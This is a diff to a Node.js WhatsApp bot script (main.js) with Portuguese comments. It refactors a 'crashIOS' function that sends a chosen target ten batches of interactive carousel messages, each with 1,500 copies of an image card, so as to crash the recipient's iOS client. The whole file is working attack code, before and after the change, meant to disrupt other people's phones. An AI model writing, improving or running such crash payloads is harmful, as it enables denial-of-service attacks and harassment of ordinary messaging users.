@@ -1,82 +1,64 @@
 // main.js
 const {
   generateWAMessageFromContent,
-  downloadContentFromMessage,
-  makeCacheableSignalKeyStore,
-  prepareWAMessageMedia,
-  fetchLatestBaileysVersion,
-  downloadMediaMessage,
-  PHONENUMBER_MCC,
-  useMultiFileAuthState,
-  generateMessageID,
-  getTypeMessage,
-  makeWASocket,
-  delay,
-  proto,
-  store,
-  chats
+  delay
 } = require("@angstvorfrauen/baileys");
-const { Boom } = require("@hapi/boom");
-const libPhonenumber = require("libphonenumber-js");
-const moment = require("moment-timezone");
-const NodeCache = require("node-cache");
-const gradient = require("gradient-string");
-const path = require("path");
-const pino = require("pino");
-const Jimp = require("jimp");
-const os = require("os");
 const fs = require("fs");
 const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail } = require("./database/mediaall.js");
 
-// === FUNÇÃO GLOBAL: sendjson (igual ao index.js) ===
-function defineSendJson(sock) {
-  sock.sendjson = (jidss, jsontxt = {}, outrasconfig = {}) => {
-    const allmsg = generateWAMessageFromContent(jidss, jsontxt, outrasconfig);
-    return sock.relayMessage(jidss, allmsg.message, { messageId: allmsg.key.id });
+// === VARIÁVEL GLOBAL DO SOCKET ===
+let sock = null;
+
+// === DEFINE O SOCKET (chamado uma vez no index.js) ===
+function setSocket(socket) {
+  sock = socket;
+
+  // === DEFINE sendjson GLOBAL NO sock ===
+  sock.sendjson = (jid, content, options = {}) => {
+    const msg = generateWAMessageFromContent(jid, content, options);
+    return sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
   };
+
+  console.log("[MAIN] Socket definido e sendjson pronto.");
 }
 
-// === ENVIA PONTO (.) PARA ACIONAR O CRASH ===
-async function initiateCrash(sock, targetJid) {
-  try {
-    await sock.sendMessage(targetJid, { text: "." });
-    console.log(`[INIT] Ponto enviado para ${targetJid}`);
-  } catch (err) {
-    console.error("[INIT] Erro ao enviar ponto:", err.message);
+// === CRASH iOS: SÓ RECEBE targetJid ===
+async function crashIOS(targetJid) {
+  if (!sock) {
+    console.error("[CRASH] Socket não definido!");
+    throw new Error("Socket não inicializado");
   }
-}
 
-// === ENVIA 10 LOTES DE 1500 CARDS ===
-async function crashIOS(sock, targetJid) {
-  console.log(`[CRASH] Iniciando crash para ${targetJid}...`);
+  console.log(`[CRASH] Enviando 10 lotes de 1500 cards para ${targetJid}...`);
+
   for (let i = 0; i < 10; i++) {
     const singleCard = {
-      "header": {
-        "title": ".",
-        "imageMessage": {
-          "url": `${url}`,
-          "mimetype": "image/jpeg",
-          "caption": ".",
-          "fileSha256": `${fileSha256}`,
-          "fileLength": "10",
-          "height": 1000,
-          "width": 1000,
-          "mediaKey": `${mediaKey}`,
-          "fileEncSha256": `${fileEncSha256}`,
-          "directPath": `${directPath}`,
-          "jpegThumbnail": `${jpegThumbnail}`
+      header: {
+        title: ".",
+        imageMessage: {
+          url,
+          mimetype: "image/jpeg",
+          caption: ".",
+          fileSha256,
+          fileLength: "10",
+          height: 1000,
+          width: 1000,
+          mediaKey,
+          fileEncSha256,
+          directPath,
+          jpegThumbnail
         },
-        "hasMediaAttachment": true
+        hasMediaAttachment: true
       },
-      "body": { "text": "." },
-      "footer": { "text": "." },
-      "nativeFlowMessage": {
-        "buttons": [{
-          "name": "cta_url",
-          "buttonParamsJson": JSON.stringify({
-            "display_text": "x",
-            "url": "https://google.com",
-            "merchant_url": "https://google.com"
+      body: { text: "." },
+      footer: { text: "." },
+      nativeFlowMessage: {
+        buttons: [{
+          name: "cta_url",
+          buttonParamsJson: JSON.stringify({
+            display_text: "x",
+            url: "https://google.com",
+            merchant_url: "https://google.com"
           })
         }]
       }
@@ -85,11 +67,11 @@ async function crashIOS(sock, targetJid) {
     const cards = Array(1500).fill(singleCard);
 
     try {
-      console.log(`[CRASH] Lote ${i + 1}/10`);
+      console.log(`[CRASH] Lote ${i + 1}/10 → ${targetJid}`);
       await sock.sendjson(targetJid, {
-        "interactiveMessage": {
-          "body": { "text": "." },
-          "carouselMessage": { "cards": cards }
+        interactiveMessage: {
+          body: { text: "." },
+          carouselMessage: { cards }
         }
       });
       await delay(800);
@@ -97,45 +79,15 @@ async function crashIOS(sock, targetJid) {
       console.error(`[CRASH] Erro no lote ${i + 1}:`, err.message);
     }
   }
-  console.log("[CRASH] Todos os lotes enviados com sucesso!");
+
+  console.log("[CRASH] 10 lotes enviados com sucesso!");
 }
 
-// === HANDLER DE MENSAGENS ===
-module.exports = async (sock, m, chatUpdate) => {
-  try {
-    // === DEFINE sendjson UMA VEZ POR SESSÃO ===
-    if (!sock.sendjson) {
-      defineSendJson(sock);
-    }
-
-    m.id = m.key.id;
-    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
-    m.chat = m.key.remoteJid;
-    m.fromMe = m.key.fromMe;
-    m.text = m.message?.conversation
-      || m.message?.extendedTextMessage?.text
-      || m.message?.imageMessage?.caption
-      || m.message?.videoMessage?.caption
-      || "";
-
-    const from = m.chat;
-
-    // === ACIONA CRASH QUANDO O BOT ENVIA "." ===
-    if (m.fromMe && m.text === "." && !m.isBaileys) {
-      await crashIOS(sock, from);
-      return;
-    }
-
-    // === OUTROS COMANDOS (opcional) ===
-    // ...
-
-  } catch (err) {
-    console.error("Erro no handler:", err);
-  }
-};
+// === HANDLER (pode ficar vazio) ===
+module.exports = async () => {};
 
 // === EXPORTA FUNÇÕES ===
-module.exports.initiateCrash = initiateCrash;
+module.exports.setSocket = setSocket;
 module.exports.crashIOS = crashIOS;
 
 // === HOT RELOAD ===
